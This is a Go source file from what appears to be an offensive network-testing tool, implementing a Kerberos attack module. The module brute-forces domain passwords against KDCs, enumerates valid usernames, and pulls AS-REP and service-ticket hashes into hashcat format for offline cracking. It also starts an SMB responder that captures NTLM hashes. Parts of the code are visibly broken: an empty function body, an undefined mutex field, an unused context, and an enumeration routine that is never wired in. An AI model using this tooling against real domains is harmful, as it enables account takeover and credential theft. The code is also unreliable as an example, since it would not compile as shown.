package cli

import (
	"context"
	"encoding/hex"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"

	"github.com/5amu/gonetexec/internal/logger"
	"github.com/5amu/gonetexec/internal/printer"
	"github.com/5amu/gonetexec/internal/runner"
	"github.com/5amu/gonetexec/pkg/kclient"
	"github.com/5amu/gonetexec/pkg/responder"
	kconfig "github.com/jcmturner/gokrb5/v8/config"
	"github.com/jcmturner/gokrb5/v8/iana/errorcode"
	"github.com/jcmturner/gokrb5/v8/keytab"
	"github.com/jcmturner/gokrb5/v8/messages"
	"github.com/mandiant/gopacket/pkg/session"
)

type Krb5Options struct {
	Targets struct {
		TARGETS []string `description:"Provide target IP/FQDN/FILE"`
	} `positional-args:"yes"`

	Connection struct {
		Username string `short:"u" description:"Provide username (or FILE)"`
		Password string `short:"p" description:"Provide password (or FILE)"`
		Domain   string `short:"d" long:"domain" description:"Provide domain"`
	} `group:"Connection Options" description:"Connection Options"`

	Mode struct {
		UserEnum  bool `long:"user-enum" description:"Enumerate valid usernames via kerberos"`
		Responder bool `long:"responder" description:"Launch a responder (testing)"`
	} `group:"Attack Mode"`

	BruteforceStrategy struct {
		ClusterBomb bool `long:"clusterbomb" description:"payload sets in clusterbomb mode (default)"`
		Pitchfork   bool `long:"pitchfork" description:"payload sets in pitchfork mode"`
	} `group:"Bruteforce Strategy"`
}

func (o *Krb5Options) Run() {
	if o.Mode.Responder {
		o.intercept()
		return
	}

	var opts *runner.RunnerOptions = &runner.RunnerOptions{}
	var strategy runner.CredentialDistributionStrategy
	if o.BruteforceStrategy.Pitchfork {
		strategy = runner.Pitchfork
	}

	targets := runner.ExtractTargets(o.Targets.TARGETS)
	credentials := runner.NewCredentialsDispacher(
		o.Connection.Username,
		o.Connection.Password,
		"",
		strategy,
	)

	var f func(session.Target, session.Credentials) error
	if o.Mode.UserEnum {
		f = func(t session.Target, c session.Credentials) error {

		}
	} else {
		// no mode will result in brute force
		opts.StopOnSuccess = true
		f = func(t session.Target, c session.Credentials) error {
			l := logger.New("KRB5", t.IP, t.Host, t.Port)
			client, err := NewKerberosClient(c.Domain, t.Host)
			if err != nil {
				l.Error(err.Error())
				return err
			}

			if ok, _ := client.TestLogin(c.Username, c.Password); ok {
				l.Info(fmt.Sprintf("%s@%s Login Successful", c.Username, c.Domain))
			} else {
				l.Error(fmt.Sprintf("%s@%s Login Failed", c.Username, c.Domain))
			}
			return nil
		}
	}

	var runners []runner.Runner
	for _, target := range targets {
		target.Port = 88
		for _, cred := range credentials {
			cred.Domain = o.Connection.Domain
			runners = append(runners, &Krb5Runner{
				target:      target,
				credentails: cred,
				run:         f,
			})
		}
	}

	if err := runner.ParallelRun(context.Background(), runners, opts); err != nil {
		fmt.Printf("Error: %s\n", err)
	}
}

type Krb5Runner struct {
	target      session.Target
	credentails session.Credentials

	cancelCtx context.CancelFunc
	run       func(session.Target, session.Credentials) error
}

func (r *Krb5Runner) Start(ctx context.Context) error {
	childCtx, cancel := context.WithCancel(ctx)
	r.cancelCtx = cancel
	defer r.Stop()

	return nil
}

func (r *Krb5Runner) Stop() {
	if r.cancelCtx != nil {
		r.cancelCtx()
	}
}

func userenum(target session.Target, creds session.Credentials) error {
	l := logger.New("KRB5", target.IP, target.Host, target.Port)

	client, err := NewKerberosClient(creds.Domain, target.Host)
	if err != nil {
		l.Error(err.Error())
		return err
	}

	if tgs, err := client.GetAsReqTgt(creds.Username); err != nil {
		_, ok := err.(*ErrorRequiresPreauth)
		if ok {
			l.Info(fmt.Sprintf("%s@%s Requires Preauth", creds.Username, creds.Domain))
		} else {
			l.Error(fmt.Sprintf("%s@%s Does Not Exist", creds.Username, creds.Domain))
		}
		return err
	} else {
		hash := tgs.Hash
		l.Info(fmt.Sprintf("%s@%s No Preauth", creds.Username, creds.Domain))
		l.Info(fmt.Sprintf("Hash: %s", hash))
	}
	return nil
}

func (o *Krb5Options) intercept() {
	resChan := make(chan *responder.NTLMResult)
	p := &responder.Producer{
		Results: resChan,
	}

	var modules map[responder.NTLMSource]func(context.Context) error = make(map[responder.NTLMSource]func(context.Context) error)
	var mod2port map[responder.NTLMSource]int = make(map[responder.NTLMSource]int)
	modules[responder.SMB] = p.GatherSMBHashes
	mod2port[responder.SMB] = 445

	go func() {
		for r := range resChan {
			o.printMutex.Lock()
			switch r.GatheredFrom {
			case responder.SMB:
				printer.NewPrinter("KRB5", r.Target, r.User, mod2port[responder.SMB]).Print(r.String())
			}
			o.printMutex.Unlock()
		}
	}()

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	errC := make(chan error)
	go func() {
		for err := range errC {
			o.printMutex.Lock()
			printer.NewPrinter("KRB5", "RESPONDER", "ERROR", 0).PrintFailure(err.Error())
			o.printMutex.Unlock()
		}
	}()

	prt := printer.NewPrinter("KRB5", "RESPONDER", "MODULES", 0)
	o.printMutex.Lock()
	for mod, runner := range modules {
		prt.SetPort(mod2port[mod])
		prt.PrintInfo(fmt.Sprintf("Starting module: %s", mod))
		go func(f func(context.Context) error) {
			if err := f(ctx); err != nil {
				errC <- err
			}
		}(runner)
	}
	o.printMutex.Unlock()

	sigchan := make(chan os.Signal, 16)
	signal.Notify(sigchan, os.Interrupt, syscall.SIGTERM)
	<-sigchan
}

func TGSToHashcat(tgs messages.Ticket, username string) string {
	return fmt.Sprintf("$krb5tgs$%d$*%s$%s$%s*$%s$%s",
		tgs.EncPart.EType,
		username,
		tgs.Realm,
		strings.Join(tgs.SName.NameString[:], "/"),
		hex.EncodeToString(tgs.EncPart.Cipher[:16]),
		hex.EncodeToString(tgs.EncPart.Cipher[16:]),
	)
}

func ASREPToHashcat(asrep messages.ASRep) string {
	return fmt.Sprintf("$krb5asrep$%d$%s@%s:%s$%s",
		asrep.EncPart.EType,
		asrep.CName.PrincipalNameString(),
		asrep.CRealm,
		hex.EncodeToString(asrep.EncPart.Cipher[:16]),
		hex.EncodeToString(asrep.EncPart.Cipher[16:]),
	)
}

// Client is a kerberos client
type KerberosClient struct {
	Realm  string
	KDCs   map[int]string
	config *kconfig.Config
	client *kclient.Client
}

func buildTemplate(realm, domainController string) string {
	if domainController == "" {
		krbTemplate := "[libdefaults]\ndns_lookup_kdc = true\ndefault_realm = {{Realm}}"
		return strings.ReplaceAll(krbTemplate, "{{Realm}}", realm)
	} else {
		krbTemplate := "[libdefaults]\ndefault_realm = {{Realm}}\n[realms]\n{{Realm}} = {\n\tkdc = {{DomainController}}\n\tadmin_server = {{DomainController}}\n}"
		return strings.ReplaceAll(strings.ReplaceAll(krbTemplate, "{{Realm}}", realm), "{{DomainController}}", domainController)
	}
}

func NewKerberosClient(domain, controller string) (*KerberosClient, error) {
	realm := strings.ToUpper(domain)
	cfg, err := kconfig.NewFromString(
		buildTemplate(realm, controller),
	)
	if err != nil {
		return nil, err
	}
	_, kdcs, err := cfg.GetKDCs(realm, false)
	if err != nil {
		return nil, fmt.Errorf("couldn't find any KDCs for realm %s. Please specify a Domain Controller", realm)
	}
	return &KerberosClient{Realm: realm, config: cfg, KDCs: kdcs}, nil
}

func (kc *KerberosClient) AuthenticateWithPassword(username, password string) {
	if kc.client != nil {
		kc.client.Destroy()
		kc.client = nil
	}
	kc.client = kclient.NewWithPassword(username, kc.Realm, password, kc.config, kclient.DisablePAFXFAST(true))
}

func (kc *KerberosClient) AuthenticateWithKeytab(username, keytabPath string) error {
	if kc.client != nil {
		return nil
	}
	keytabData, err := keytab.Load(keytabPath)
	if err != nil {
		return err
	}
	kc.client = kclient.NewWithKeytab(username, kc.Realm, keytabData, kc.config, kclient.DisablePAFXFAST(true))
	return nil
}

type TGS struct {
	Ticket               messages.Ticket
	TargetUser           string
	ServicePrincipalName string
	Hash                 string
}

func (c *KerberosClient) GetServiceTicket(target, spn string) (*TGS, error) {
	ticket, _, err := c.client.GetServiceTicket(spn)
	if err != nil {
		return nil, err
	}
	return &TGS{
		Ticket: ticket,
		Hash:   TGSToHashcat(ticket, target),
	}, nil
}

type AsRepTGT struct {
	Ticket *messages.ASRep
	User   string
	Hash   string
}

type ErrorRequiresPreauth struct {
	msg string
}

func (e *ErrorRequiresPreauth) Error() string {
	return e.msg
}

func (c *KerberosClient) GetAsReqTgt(username string) (*AsRepTGT, error) {
	c.AuthenticateWithPassword(username, "lolz")
	defer c.client.Destroy()

	req, err := messages.NewASReqForTGT(c.Realm, c.config, c.client.Credentials.CName())
	if err != nil {
		return nil, err
	}

	b, err := req.Marshal()
	if err != nil {
		return nil, err
	}

	rb, err := c.client.SendToKDC(b, c.Realm)
	if err != nil {
		e, ok := err.(messages.KRBError)
		if !ok {
			return nil, err
		}
		switch e.ErrorCode {
		case errorcode.KDC_ERR_C_PRINCIPAL_UNKNOWN:
			return nil, fmt.Errorf("user %s does not exist", username)
		case errorcode.KDC_ERR_PREAUTH_REQUIRED:
			return nil, &ErrorRequiresPreauth{
				msg: fmt.Sprintf("user %s exists, requires preauth", username),
			}
		default:
			return nil, err
		}
	}

	var t messages.ASRep
	if err := t.Unmarshal(rb); err != nil {
		return nil, err
	}

	return &AsRepTGT{
		Ticket: &t,
		User:   username,
		Hash:   ASREPToHashcat(t),
	}, nil
}

func (c *KerberosClient) TestLogin(username, password string) (bool, error) {
	client := kclient.NewWithPassword(username, c.Realm, password,
		c.config, kclient.DisablePAFXFAST(true), kclient.AssumePreAuthentication(true),
	)
	defer client.Destroy()

	if ok, err := client.IsConfigured(); !ok {
		return false, err
	}

	if err := client.Login(); err != nil {
		return false, err
	}
	return true, nil
}

func (c *KerberosClient) Close() {
	c.client.Destroy()
}
